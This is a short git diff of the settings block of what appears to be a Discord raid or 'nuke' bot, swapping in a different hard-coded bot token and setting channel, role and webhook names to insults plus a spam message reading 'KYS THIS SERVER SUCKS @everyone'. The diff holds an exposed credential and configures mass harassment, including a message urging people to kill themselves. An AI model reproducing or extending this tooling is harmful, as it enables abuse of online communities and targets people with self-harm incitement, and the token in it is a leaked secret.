@@ -14,18 +14,18 @@ uvloop.install()
 
 # Set up
 PREFIX = "o!"
-TOKEN = "MTAxMTY5OTAwNzgzMzI1NjA0Ng.GM5ysF.zcc8hLckHYPls8W5yYaxcsPkMrf-52siD4Z5_s"
-CHANNEL_NAME = ["OMEGA"]
-ROLE_NAME = ["OMEGA"]
-SPAM_MSG = ["OMEGA CUM"]
-WEBHOOK_NAME = ["OMEGA"]
+TOKEN = "MTAyMjMwODU0MjMwNjMyNDYxMQ.GDcXaa.qSNQ4P76L5uMtiJWvN3RinV5DvzJUj7M8bvLuo"
+CHANNEL_NAME = ["this server sucks"]
+ROLE_NAME = ["L"]
+SPAM_MSG = ["KYS THIS SERVER SUCKS @everyone"]
+WEBHOOK_NAME = ["server sucks"]
 with open('./omega.gif', 'rb') as f:
 	IMAGE = f.read()
 
 
 
 # CONSTANTS
-BASE_URL = "https://discord.com/api/v9"
+BASE_URL = "https://discord.com/api/oauth2"
 HEADER = {"authorization": f"Bot {TOKEN}"}
 
 
